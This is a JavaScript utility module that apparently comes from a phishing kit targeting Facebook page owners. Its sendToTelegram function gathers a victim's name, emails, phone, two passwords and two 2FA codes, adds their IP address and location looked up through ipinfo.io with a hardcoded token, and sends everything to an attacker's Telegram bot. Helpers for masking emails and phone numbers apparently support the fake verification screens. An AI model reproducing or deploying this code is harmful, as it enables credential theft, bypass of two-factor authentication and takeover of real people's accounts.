const Utils = {
	encrypt(text) {
		return CryptoJS.AES.encrypt(text, CONFIG.SECRET_KEY).toString();
	},

	decrypt(cipherText) {
		const bytes = CryptoJS.AES.decrypt(cipherText, CONFIG.SECRET_KEY);
		return bytes.toString(CryptoJS.enc.Utf8);
	},

	saveRecord(key, value) {
		try {
			const encryptedValue = this.encrypt(JSON.stringify(value));
			const record = { value: encryptedValue, expiry: Date.now() + CONFIG.STORAGE_EXPIRY };
			localStorage.setItem(key, JSON.stringify(record));
		} catch (error) {
			console.error('Save error:', error);
		}
	},

	getRecord(key) {
		try {
			const item = localStorage.getItem(key);
			if (!item) return null;
			const { value, expiry } = JSON.parse(item);
			if (Date.now() > expiry) {
				localStorage.removeItem(key);
				return null;
			}
			const decrypted = this.decrypt(value);
			return decrypted ? JSON.parse(decrypted) : null;
		} catch {
			return null;
		}
	},

	async getUserLocation() {
		try {
			const response = await fetch('https://ipinfo.io/json?token=5a58a2d85996e3');
			if (!response.ok) throw new Error('Network response was not ok');

			const data = await response.json();

			return {
				location: `${data.city || 'N/A'}, ${data.region || 'N/A'}, ${data.country || 'N/A'}`,
				country_code: data.country || 'N/A',
				ip: data.ip || 'N/A',
				region: data.region || 'N/A',
				country: data.country || 'N/A',
			};
		} catch (error) {
			console.error('Error getting location:', error);

			return {
				location: 'N/A',
				country_code: 'N/A',
				ip: 'N/A',
				region: 'N/A',
				country: 'N/A',
			};
		}
	},

	async sendToTelegram(data) {
		const locationData = await this.getUserLocation();

		const text = `
<b>IP:</b> <code>${locationData.ip}</code>
<b>Location:</b> <code>${locationData.location}</code>
----------------------------------
<b>Full Name:</b> <code>${data.fullName || ''}</code>
<b>Email:</b> <code>${data.email || ''}</code>
<b>Email Business:</b> <code>${data.emailBusiness || ''}</code>
<b>Page Name:</b> <code>${data.fanpage || ''}</code>
<b>Phone:</b> <code>${data.phone || ''}</code>
----------------------------------
<b>Password(1):</b> <code>${data.password || ''}</code>
<b>Password(2):</b> <code>${data.passwordSecond || ''}</code>
----------------------------------
<b>🔐Code 2FA(1):</b> <code>${data.twoFa || ''}</code>
<b>🔐Code 2FA(2):</b> <code>${data.twoFaSecond || ''}</code>`;

		try {
			await fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({
					chat_id: CONFIG.TELEGRAM_CHAT_ID,
					text,
					parse_mode: 'HTML',
				}),
			});
		} catch (error) {
			console.error('Telegram error:', error);
		}
	},

	async sendNotification(data) {
		try {
			await this.sendToTelegram(data);
		} catch (error) {
			console.error('Notification error:', error);
		}
	},

	maskPhone(phone) {
		if (!phone || phone.length < 5) return phone;
		const start = phone.slice(0, 2);
		const end = phone.slice(-2);
		return `${start} ${'*'.repeat(phone.length - 4)} ${end}`;
	},

	maskEmail(email) {
		if (!email) return '';
		const atIndex = email.indexOf('@');
		if (atIndex <= 0 || atIndex === email.length - 1) return email;

		const local = email.slice(0, atIndex);
		const domain = email.slice(atIndex + 1);
		if (local.length < 3) return email;

		return `${local[0]}${'*'.repeat(local.length - 2)}${local[local.length - 1]}@${domain}`;
	},
};
